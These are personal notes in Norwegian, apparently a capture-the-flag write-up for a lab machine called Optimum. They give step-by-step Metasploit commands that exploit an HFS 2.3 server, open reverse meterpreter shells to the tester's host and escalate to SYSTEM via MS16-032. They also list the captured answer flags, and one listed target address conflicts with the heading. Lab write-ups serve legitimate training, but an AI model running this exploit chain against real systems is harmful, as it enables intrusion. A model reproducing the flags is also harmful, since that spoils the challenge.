## optimum 10.10.10.8

windows server 2012 x64

nmap port 80

hfs 2.3 server. finnes exploit

`use exploit/windows/http/rejetto_hfs_exec`

sett srvhost til samme som lhost men ikke srvport

husk å sette lhost også

`use post/multi/manage/shell_to_meterpreter`

user.txt **d0c39409d7b994a9a1389ebf38ef5f73**

MS16-032 SYSTEM Privilege Escalation

prøvd å laste opp ps1-script og får kjørt det, men prosessen ligger i bakgrunnen.- sjekk ps kommando

må finne en måte å få reverse shell fra powershellet

`use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`

tror denne er riktig.

`use post/multi/recon/local_exploit_suggester`**  **

```
use exploit/windows/local/payload_inject
set payload windows/powershell_reverse_tcp
```

`Import-Module ./lol.ps1`

`Invoke-MS16-032`

gjøre fra 32 til 64 bit shell

`use windows/local/payload_inject`

`set payload windows/x64/meterpreter/reverse_tcp`

skal ikke være patchet i følge `get-hotfix`

`PS C:\Users\kostas\Desktop>get-executionpolicy`

`Bypass`

skal være mulig å execute hva som helst

`set target 1 `**- viktig for å sette target til x64**



ting som må stemme:

**må ha et x64 meterpreter shell**

**må sette target til x64**

**må sette payload til x64/meterpreter**



`set payload windows/x64/meterpreter/reverse_tcp`

`use exploit/windows/http/rejetto_hfs_exec`

`set srvhost 10.10.12.238`

`set lhost 10.10.12.238`

`set rhost 10.10.10.1`

`set lport 4444`

`exploit`



`use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`

`set session 1`

`set target 1`

`set lhost 10.10.12.238`

`set lport 4444`

`exploit`



root.txt **51ed1b36553c8461f4552c2e92b3eeed**

